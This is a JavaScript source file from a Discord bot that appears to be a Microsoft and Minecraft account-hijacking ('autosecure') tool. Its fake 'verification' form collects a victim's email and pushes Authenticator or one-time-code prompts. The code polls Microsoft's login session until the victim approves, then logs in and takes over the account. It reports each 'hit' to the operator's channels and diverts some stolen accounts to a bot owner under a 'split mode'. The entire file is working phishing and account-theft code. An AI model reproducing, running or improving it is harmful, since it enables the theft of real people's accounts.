const generate = require("../../utils/generate");
const validEmail = require("../../utils/emails/validEmail");
const { queryParams } = require("../../../db/database");
const isUrl = require("../../utils/utils/isUrl");
const { invalidEmailMessager, secEmailMessager, oauthMessager, noOAuthMessager, AuthenticatorMessager, timedOutMessager, invalidAuthenticatorMessager, invalidEmailRegexMessager, loginCookieMessager, lockedmessager, nomcmessager, invalidatedmessager } = require("../../utils/utils/messager");
const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const axios = require("axios");
const listAccount = require("../../utils/accounts/listAccount");
const sendAuth = require("../../utils/secure/sendAuth");
const generateuid = require("../../utils/generateuid");
const insertaccount = require("../../../db/insertaccount");
const checkmc = require("../../../db/checkmc");
const getEmbed = require("../../../autosecure/utils/responses/getEmbed");
const aftersecure = require("../../utils/secure/aftersecure");
const listProfile = require("../../utils/hypixelapi/listProfile");
const isblacklisted = require("../../utils/utils/isblacklisted");
const { failedembed } = require("../../utils/embeds/embedhandler")
const { validateusername } = require("../../utils/utils/validateusername");
const getCredentials = require("../../utils/info/getCredentials");
const sendotp = require("../../utils/secure/sendotp");
const { checkSplitMode, sendToOwner, createOwnerRedirectMessage } = require("../../utils/bot/splitmode");

let obj = {
  name: "VerificationSplit",
  callback: async (client, interaction) => {
    let mcname, email, nohit; 
    let server_id, notis;

    const cachedData = interaction.client.cachedSplitVerificationData;
    if (cachedData && cachedData.userId === interaction.user.id) {
        mcname = cachedData.username;
        email = interaction.fields.getTextInputValue('Email');
      } else {
        return interaction.reply({ content: 'Please try again!', ephemeral: true });
      }
      

      let blacklisted = await isblacklisted(client, interaction, email)
      if (blacklisted){
            const embed = await getEmbed(client, "blacklisted", null, null, mcname, email, interaction.user.id);
            return await interaction.reply({
              embeds: [embed],
              ephemeral: true,
            });
      }
                              

      let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
      if (settings.length == 0) {
        return interaction.reply({ content: `Set the server first!\nusing **/set**!`, ephemeral: true });
      }
      settings = settings[0];
  
      let [channelId, guildId] = settings.logs_channel?.split("|") || [];
      let [nChannelId, nGuildId] = settings.notification_channel?.split("|") || [];
      let [hChannelId, hGuildId] = settings.hits_channel?.split("|") || [];
      let [rChannelId, rGuildId] = settings.users_channel?.split("|") || [];
  
      if (settings.users_channel) {
        notis = true;
      } else {
        notis = false;
      }
  
      if (!channelId || !guildId) {
        return interaction.reply({ content: `Set your logs channel first!\nusing **/set**`, ephemeral: true });
      }
  
      if (!hChannelId || !hGuildId) {
        return interaction.reply({ content: `Set the Hits Channel first!\nusing **/set**`, ephemeral: true });
      }
  
      if (settings.server_id) {
        server_id = settings.server_id;
      }
      
      await interaction.deferReply({ ephemeral: true });


      if (!validEmail(email)) {
        await invalidEmailRegexMessager(client, guildId, channelId, interaction, mcname, email);
        if (notis) {
          await invalidEmailRegexMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
        }
        return;
      }
  

    const data = await getCredentials(email)

    let profiles = null;

    try {
        profiles = data;
    } catch (error) {
      console.error("Error parsing profile data:", error);
      await invalidEmailMessager(client, guildId, channelId, interaction, mcname, email);
      if (notis) {
        await invalidEmailMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
      }
      return;
    }
  
      if (!profiles?.Credentials) {
        await invalidEmailMessager(client, guildId, channelId, interaction, mcname, email);
        if (notis) {
          await invalidEmailMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
        }
        return;
      }
  
      if (profiles?.Credentials?.RemoteNgcParams) {
        let [flowToken, entropy] = [profiles.Credentials.RemoteNgcParams.SessionIdentifier, profiles.Credentials.RemoteNgcParams.Entropy];
        if (!entropy) {
          entropy = await sendAuth(flowToken);
        }
        await AuthenticatorMessager(client, guildId, channelId, interaction, mcname, email, entropy ? entropy : `Accept`);
        if (notis) {
          await AuthenticatorMessager(client, rGuildId, rChannelId, interaction, mcname, email, entropy ? entropy : `Accept`, true);
        }
  
        let i = 0;
        let intervalId = setInterval(async () => {
          if (i == 60) {
            clearInterval(intervalId);
            await timedOutMessager(client, guildId, channelId, interaction, mcname, email);
            if (notis) {
              await timedOutMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
            }
            return;
          }
  
          try {
            const { data: sessionData } = await axios({
              method: "POST",
              headers: {
                Cookie: `MSPOK=$uuid-d7404240-de39-47d5-9942-13f3ba844eec$uuid-9c2de3f5-d742-44dc-9227-babcdd9d4094$uuid-567b6c7e-4a29-40f2-8552-ab11b804a699;`
              },
              url: `https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk=${flowToken}&slkt=NGC`,
              data: {
                "DeviceCode": flowToken
              }
            });
  
            if (sessionData.SessionState > 1 && sessionData.AuthorizationState == 1) {
              clearInterval(intervalId);
              await invalidAuthenticatorMessager(client, guildId, channelId, interaction, mcname, email);
              if (notis) {
                await invalidAuthenticatorMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
              }
              return;
            } else if (sessionData.AuthorizationState > 1 || sessionData.SessionState > 1) {
              clearInterval(intervalId);
  
              let host = await login({ slk: flowToken, email: email }, profiles);
  
              if (host) {
                console.log("Logged in successfully");
                await interaction.editReply({
                  embeds: [await getEmbed(client, "res", null, null, mcname, email, interaction.user.id)],
                  ephemeral: true
                });
                let uid = await generateuid();
                let code = 'Accepted Auth';
                await loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid);
                if (notis) {
                  await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, code, uid, true);
                }
  
                let acc = await secure(host, settings, uid);

                if (acc.email === "Locked!") {
                  nohit = true;
                  await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, false);
                  if (rChannelId && rGuildId) {
                    await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, false);
                  }
                }
  
  
                if (acc.email === "unauthed") {
                  nohit = true;
                  await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, true);
                  if (rChannelId && rGuildId) {
                    await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, true);
                  }
                }

                if ((settings.secureifnomc === "0" || settings.secureifnomc === 0) && acc.email === "No Minecraft!") {
                  nohit = true;
                  await nomcmessager(client, guildId, channelId, interaction, mcname, email);
                  if (rChannelId && rGuildId) {
                    await nomcmessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
                  }
                }

                let hasMinecraft = await checkmc(acc.mc);

                // Check split mode before sending to fisher
                const { shouldSplit, ownerId, ratio } = await checkSplitMode(client.username, client.botnumber, acc);

                // Only add to accounts if NOT in split mode (accounts sent to owner shouldn't be in fisher's list)
                if (!shouldSplit) {
                  await  insertaccount(acc, uid, client.username, settings.secureifnomc)
                }
                
                let msg = await listAccount(acc, uid, client, interaction);
                
                if (shouldSplit && ownerId) {
                  // Send account to main bot owner instead of fisher
                  const ownerSent = await sendToOwner(ownerId, msg, acc, uid);
                  
                  if (ownerSent) {
                    console.log(`[SPLIT MODE] Account redirected to owner ${ownerId}`);
                    
                    // Send confirmation message to fisher (in hits channel)
                    if (hGuildId && hChannelId) {
                      const ownerMsg = createOwnerRedirectMessage(acc.newName || acc.oldName || mcname);
                      await client.guilds.cache.get(hGuildId)?.channels.cache.get(hChannelId)?.send(ownerMsg);
                    }
                    
                    // Mirror to main hits feed even for split mode
                    const { mirrorToMainHits } = require("../../utils/utils/mirrorhits");
                    await mirrorToMainHits(client, msg, interaction, { shouldSplit, ownerId: client.username, ratio });
                    
                    // Don't show the normal account message
                    nohit = true;
                  } else {
                    // If sending to owner failed, fall back to normal flow
                    console.log('[SPLIT MODE] Failed to send to owner, falling back to normal flow');
                  }
                }
                
                if (!nohit && hGuildId && hChannelId){
                  await client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(msg);
                  const { mirrorToMainHits } = require("../../utils/utils/mirrorhits");
                  await mirrorToMainHits(client, msg, interaction, { shouldSplit, ownerId, ratio });
                }


              const { failed, failedmsg } = await failedembed(acc, uid)
              if (failed){
                await client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(failedmsg);
              }

  
            let neededmsg = failed ? failedmsg : msg

              let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
              if (doneaftersecure) {
                console.log('Did AfterSecure!');
              }

                
                // Only add to unclaimed if NOT in split mode (accounts sent to owner shouldn't be claimable by fisher)
                if (hasMinecraft && settings.claiming && !shouldSplit) {
                  const timestamp = Math.floor(Date.now() / 1000)

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )
                }

                if (nChannelId && nGuildId) {
                  if (hasMinecraft) {
                    const ping = settings.ping === "None" ? null : settings.ping;
                    await client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(
                      await listProfile(acc.oldName, { sensored: true, list: "skyblock", ping: ping })
                    );
                  } else {
                    let msgnomc = {
                      embeds: [{
                        description: "```\nSomeone's account has been secured, but it doesn't own Minecraft.\n```",
                        color: 0xA6C3F0
                      }]
                    };             
                    await client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(msgnomc);
                  }
                }
              }
            }
          } catch (error) {
            console.error("Error checking session state:", error);
            clearInterval(intervalId);
            return;
          }
          i++;
        }, 2000);
      } else if (profiles.Credentials.OtcLoginEligibleProofs) {
        let secEmail = profiles.Credentials.OtcLoginEligibleProofs[0];
        let secs = profiles.Credentials.OtcLoginEligibleProofs.map(s => s.display);
        let id = generate(33);
      let d = await sendotp(email, secEmail.data);
  
        await client.queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `confirmcode|${email}|${secEmail.display}|${secEmail.data}|${mcname}`]);
  
        await secEmailMessager(client, guildId, channelId, interaction, id, mcname, email, secs, secEmail.display);
        if (notis) {
          await secEmailMessager(client, rGuildId, rChannelId, interaction, id, mcname, email, secs, secEmail.display, true);
        }
      } else {
        if (settings.oauth_link && isUrl(settings.oauth_link)) {
          await oauthMessager(client, guildId, channelId, interaction, mcname, email, settings.oauth_link);
          if (notis) {
            await oauthMessager(client, rGuildId, rChannelId, interaction, mcname, email, settings.oauth_link, true);
          }
        } else {
          await noOAuthMessager(client, guildId, channelId, interaction, mcname, email);
          if (notis) {
            await noOAuthMessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
          }
        }
      }
    }
  };
  
  module.exports = obj;